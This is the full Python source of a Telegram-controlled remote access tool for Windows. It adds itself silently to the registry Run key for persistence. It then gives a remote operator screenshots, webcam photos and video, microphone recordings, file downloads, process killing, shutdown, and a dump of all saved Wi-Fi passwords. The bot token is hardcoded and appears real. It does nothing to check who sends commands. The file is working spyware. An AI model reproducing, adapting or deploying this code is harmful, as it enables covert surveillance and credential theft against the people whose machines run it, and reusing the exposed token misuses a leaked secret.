import os
import psutil
import platform
import subprocess
import socket
import shutil
import cv2
import time
import re
import wave
import pyaudio
from datetime import datetime
from io import BytesIO
from PIL import ImageGrab
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext


import winreg as reg
import sys
import os
import socket
import time

def wait_for_internet(timeout=300, check_interval=5):
    """Wait for internet connection before starting the bot"""
    print("[INFO] Checking internet connection...")
    start_time = time.time()
    
    while time.time() - start_time < timeout:
        try:
            # Try to connect to Google's DNS and Telegram API
            socket.create_connection(("8.8.8.8", 53), timeout=3)
            socket.create_connection(("api.telegram.org", 443), timeout=3)
            print("[INFO] Internet connection established!")
            return True
        except (socket.error, socket.timeout):
            elapsed = int(time.time() - start_time)
            print(f"[INFO] Waiting for internet connection... ({elapsed}s)")
            time.sleep(check_interval)
    
    print(f"[ERROR] No internet connection after {timeout} seconds")
    return False

def add_to_startup():
    """Add this program to Windows startup"""
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
        exe_path = os.path.abspath(exe_path)
        
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "Newtest", 0, reg.REG_SZ, exe_path)
        reg.CloseKey(key)
        print(f"[INFO] Added to startup: {exe_path}")
        return True
    except Exception as e:
        print(f"[WARNING] Could not add to startup: {e}")
        return False

def is_in_startup():
    """Check if already in startup"""
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_READ)
        try:
            reg.QueryValueEx(key, "Newtest")
            reg.CloseKey(key)
            return True
        except FileNotFoundError:
            reg.CloseKey(key)
            return False
    except:
        return False

# Wait for internet connection before starting
if not wait_for_internet():
    print("[ERROR] Cannot start bot without internet connection")
    sys.exit(1)

# Auto-add to startup on first run
if not is_in_startup():
    if add_to_startup():
        print("[SUCCESS] Bot added to Windows startup!")

# ================= CONFIG ===================
BOT_TOKEN = "8206776636:AAEc2rXOQ9jAw8XB6-nTTD_w6shHuDg8F40"  # Replace with your bot token
CAMERA_INDEX = 1  # Default camera index (0=first cam, 1=second cam, etc.)

# ============== CORE FUNCTIONS ==============

def send_system_info(update: Update, context: CallbackContext):
    os_info = platform.platform()
    cpu = psutil.cpu_percent(interval=1)
    mem = psutil.virtual_memory()
    uptime = round((datetime.now() - datetime.fromtimestamp(psutil.boot_time())).total_seconds() / 3600, 2)

    update.message.reply_text(
        f"System: {os_info}\n"
        f"CPU Load: {cpu}%\n"
        f"Memory: {round(mem.used/1e6,2)} MB / {round(mem.total/1e6,2)} MB\n"
        f"Uptime: {uptime} hrs"
    )

def show_current_directory(update: Update, context: CallbackContext):
    update.message.reply_text(os.getcwd())

def change_directory(update: Update, context: CallbackContext):
    if not context.args:
        update.message.reply_text("Usage: /cd <path>")
        return
    path = " ".join(context.args)
    if os.path.isdir(path):
        os.chdir(path)
        update.message.reply_text(f"Moved to: {os.getcwd()}")
    else:
        update.message.reply_text("Invalid path")

def list_files(update: Update, context: CallbackContext):
    items = os.listdir(os.getcwd())
    update.message.reply_text("\n".join(items) if items else "Empty directory")

def send_file(update: Update, context: CallbackContext):
    if not context.args:
        update.message.reply_text("Usage: /getfile <filename>")
        return
    file = " ".join(context.args)
    if os.path.isfile(file):
        with open(file, "rb") as f:
            update.message.reply_document(f)
    else:
        update.message.reply_text("File not found")

# ============== SCREENSHOT ==============

def screenshot(update: Update, context: CallbackContext):
    try:
        img = ImageGrab.grab().resize((1280, 720))
        bio = BytesIO()
        img.save(bio, "PNG")
        bio.seek(0)
        update.message.reply_photo(photo=bio)
    except Exception as e:
        update.message.reply_text(f"Screenshot failed: {e}")

def camera_record(update: Update, context: CallbackContext):
    update.message.reply_text("Recording 10 seconds from camera...")
    video_file = "camera_capture.mp4"
    cap = None
    
    try:
        global CAMERA_INDEX
        cap = cv2.VideoCapture(CAMERA_INDEX, cv2.CAP_DSHOW)
        
        if not cap.isOpened():
            update.message.reply_text(f"Cannot access camera {CAMERA_INDEX}. Use /listcam and /setcam <index>")
            return
        
        fps = 20
        width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(video_file, fourcc, fps, (width, height))
        
        start_time = time.time()
        frame_count = 0
        while time.time() - start_time < 10:
            ret, frame = cap.read()
            if ret:
                out.write(frame)
                frame_count += 1
        
        cap.release()
        out.release()
        
        if frame_count == 0:
            update.message.reply_text("No frames captured")
            if os.path.exists(video_file):
                os.remove(video_file)
            return
        
        with open(video_file, 'rb') as f:
            update.message.reply_video(video=f)
        
        os.remove(video_file)
        
    except Exception as e:
        update.message.reply_text(f"Camera recording failed: {e}")
        if cap:
            cap.release()
        if os.path.exists(video_file):
            os.remove(video_file)

def webcam_photo(update: Update, context: CallbackContext):
    try:
        global CAMERA_INDEX
        cap = cv2.VideoCapture(CAMERA_INDEX, cv2.CAP_DSHOW)
        
        if not cap.isOpened():
            update.message.reply_text(f"Cannot access camera {CAMERA_INDEX}. Use /listcam and /setcam <index>")
            return
        
        ret, frame = cap.read()
        cap.release()
        
        if not ret:
            update.message.reply_text("Failed to capture image")
            return
        
        _, buffer = cv2.imencode('.jpg', frame)
        bio = BytesIO(buffer)
        bio.seek(0)
        update.message.reply_photo(photo=bio)
        
    except Exception as e:
        update.message.reply_text(f"Webcam capture failed: {e}")
        if 'cap' in locals() and cap:
            cap.release()

def set_camera(update: Update, context: CallbackContext):
    global CAMERA_INDEX
    if not context.args:
        update.message.reply_text(f"Current camera: {CAMERA_INDEX}\nUsage: /setcam <index>")
        return
    
    try:
        new_index = int(context.args[0])
        CAMERA_INDEX = new_index
        update.message.reply_text(f"Camera set to index {CAMERA_INDEX}")
    except:
        update.message.reply_text("Invalid camera index")

def list_cameras(update: Update, context: CallbackContext):
    try:
        cameras = []
        for i in range(5):
            cap = cv2.VideoCapture(i, cv2.CAP_DSHOW)
            if cap.isOpened():
                cameras.append(f"Camera {i}: Available")
                cap.release()
        
        if cameras:
            update.message.reply_text("Available cameras:\n" + "\n".join(cameras))
        else:
            update.message.reply_text("No cameras found")
    except Exception as e:
        update.message.reply_text(f"Error listing cameras: {e}")

# ============== SYSTEM CONTROL ==============

def shutdown_pc(update: Update, context: CallbackContext):
    update.message.reply_text("Shutting down")
    subprocess.run("shutdown /s /t 1", shell=True)

def restart_pc(update: Update, context: CallbackContext):
    update.message.reply_text("Restarting")
    subprocess.run("shutdown /r /t 1", shell=True)

def lock_pc(update: Update, context: CallbackContext):
    subprocess.run("rundll32.exe user32.dll,LockWorkStation", shell=True)

# ============== NEW FEATURES ==============

def uptime(update: Update, context: CallbackContext):
    up = round((datetime.now() - datetime.fromtimestamp(psutil.boot_time())).total_seconds() / 3600, 2)
    update.message.reply_text(f"System uptime: {up} hours")

def disk_info(update: Update, context: CallbackContext):
    total, used, free = shutil.disk_usage(os.getcwd())
    update.message.reply_text(
        f"Disk:\nTotal: {round(total/1e9,2)} GB\nUsed: {round(used/1e9,2)} GB\nFree: {round(free/1e9,2)} GB"
    )

def network_info(update: Update, context: CallbackContext):
    host = socket.gethostname()
    local_ip = socket.gethostbyname(host)
    
    try:
        import urllib.request
        public_ip = urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
    except:
        public_ip = "Unable to fetch"
    
    update.message.reply_text(
        f"Hostname: {host}\n"
        f"Local IP: {local_ip}\n"
        f"Public IP: {public_ip}"
    )

def active_ports(update: Update, context: CallbackContext):
    try:
        ports_info = []
        connections = psutil.net_connections(kind='inet')
        seen_ports = set()
        
        for conn in connections:
            if conn.laddr and conn.status == 'LISTEN':
                port = conn.laddr.port
                if port not in seen_ports:
                    try:
                        proc = psutil.Process(conn.pid) if conn.pid else None
                        service = proc.name() if proc else "Unknown"
                    except:
                        service = "Unknown"
                    
                    ports_info.append(f"{port} - {service}")
                    seen_ports.add(port)
        
        if ports_info:
            msg = "Active Listening Ports:\n" + "\n".join(sorted(ports_info[:20]))
        else:
            msg = "No active listening ports found"
        
        update.message.reply_text(msg)
    except Exception as e:
        update.message.reply_text(f"Error fetching ports: {e}")

def list_processes(update: Update, context: CallbackContext):
    procs = []
    for p in psutil.process_iter(['pid', 'name']):
        try:
            procs.append(f"{p.info['pid']} | {p.info['name']}")
        except:
            pass
    update.message.reply_text("\n".join(procs[:15]))

def kill_process(update: Update, context: CallbackContext):
    if not context.args:
        update.message.reply_text("Usage: /kill <process>")
        return
    name = context.args[0].lower()
    for p in psutil.process_iter(['name']):
        if p.info['name'] and name in p.info['name'].lower():
            p.kill()
            update.message.reply_text(f"Killed: {p.info['name']}")
            return
    update.message.reply_text("Process not found")

def open_website(update: Update, context: CallbackContext):
    if not context.args:
        update.message.reply_text("Usage: /open <url>")
        return
    subprocess.Popen(f"start {context.args[0]}", shell=True)
    update.message.reply_text("Opened website")

def record_audio(update: Update, context: CallbackContext):
    if not context.args:
        update.message.reply_text("Usage: /record <seconds>")
        return
    
    try:
        duration = int(context.args[0])
        if duration > 60:
            update.message.reply_text("Max recording time is 60 seconds")
            return
        
        update.message.reply_text(f"Recording for {duration} seconds...")
        
        # PyAudio recording
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        
        frames = []
        for _ in range(0, int(RATE / CHUNK * duration)):
            data = stream.read(CHUNK)
            frames.append(data)
        
        stream.stop_stream()
        stream.close()
        p.terminate()
        
        # Save to file
        audio_file = "recording.wav"
        wf = wave.open(audio_file, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        
        # Send audio file
        with open(audio_file, 'rb') as f:
            update.message.reply_audio(audio=f)
        
        # Clean up
        os.remove(audio_file)
        
    except ValueError:
        update.message.reply_text("Invalid duration. Use a number.")
    except Exception as e:
        update.message.reply_text(f"Recording failed: {e}")
        if os.path.exists("recording.wav"):
            os.remove("recording.wav")

def wifi_networks(update: Update, context: CallbackContext):
    try:
        profiles_output = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
        profile_names = re.findall(r"All User Profile\s*:\s*(.+)", profiles_output)
        
        if not profile_names:
            update.message.reply_text("No saved WiFi networks found")
            return
        
        wifi_info = ["📡 Saved WiFi Networks:\n"]
        
        for profile in profile_names:
            profile = profile.strip()
            try:
                profile_info = subprocess.check_output(
                    f'netsh wlan show profile name="{profile}" key=clear',
                    shell=True,
                    text=True,
                    stderr=subprocess.DEVNULL
                )
                
                password_match = re.search(r"Key Content\s*:\s*(.+)", profile_info)
                password = password_match.group(1).strip() if password_match else "No password"
                
                wifi_info.append(f"\n🔹 {profile}\n   Password: {password}")
            except:
                wifi_info.append(f"\n🔹 {profile}\n   Password: Unable to retrieve")
        
        message = "".join(wifi_info)
        if len(message) > 4000:
            chunks = [message[i:i+4000] for i in range(0, len(message), 4000)]
            for chunk in chunks:
                update.message.reply_text(chunk)
        else:
            update.message.reply_text(message)
        
    except Exception as e:
        update.message.reply_text(f"Failed to get WiFi info: {e}")

# ============== HELP ==============

def help_message(update: Update, context: CallbackContext):
    update.message.reply_text(
        "📊 System: /sysinfo /uptime /disk /net /ports\n"
        "📁 Files: /pwd /cd /ls /getfile\n"
        "📸 Media: /screenshot /camera /webcam /listcam /setcam\n"
        "🎵 Audio: /record <seconds>\n"
        "📡 Network: /wifi /processes /kill /open\n"
        "⚡ Control: /shutdown /restart /lock"
    )

def unknown(update: Update, context: CallbackContext):
    update.message.reply_text("Unknown command. Use /help")

# ============== MAIN ==============

def main():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("sysinfo", send_system_info))
    dp.add_handler(CommandHandler("pwd", show_current_directory))
    dp.add_handler(CommandHandler("cd", change_directory))
    dp.add_handler(CommandHandler("ls", list_files))
    dp.add_handler(CommandHandler("getfile", send_file))
    dp.add_handler(CommandHandler("screenshot", screenshot))
    dp.add_handler(CommandHandler("camera", camera_record))
    dp.add_handler(CommandHandler("webcam", webcam_photo))
    dp.add_handler(CommandHandler("listcam", list_cameras))
    dp.add_handler(CommandHandler("setcam", set_camera))
    dp.add_handler(CommandHandler("uptime", uptime))
    dp.add_handler(CommandHandler("disk", disk_info))
    dp.add_handler(CommandHandler("net", network_info))
    dp.add_handler(CommandHandler("ports", active_ports))
    dp.add_handler(CommandHandler("processes", list_processes))
    dp.add_handler(CommandHandler("kill", kill_process))
    dp.add_handler(CommandHandler("open", open_website))
    dp.add_handler(CommandHandler("record", record_audio))
    dp.add_handler(CommandHandler("wifi", wifi_networks))
    dp.add_handler(CommandHandler("shutdown", shutdown_pc))
    dp.add_handler(CommandHandler("restart", restart_pc))
    dp.add_handler(CommandHandler("lock", lock_pc))
    dp.add_handler(CommandHandler("help", help_message))
    dp.add_handler(MessageHandler(Filters.command, unknown))

    print("Bot started...")
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
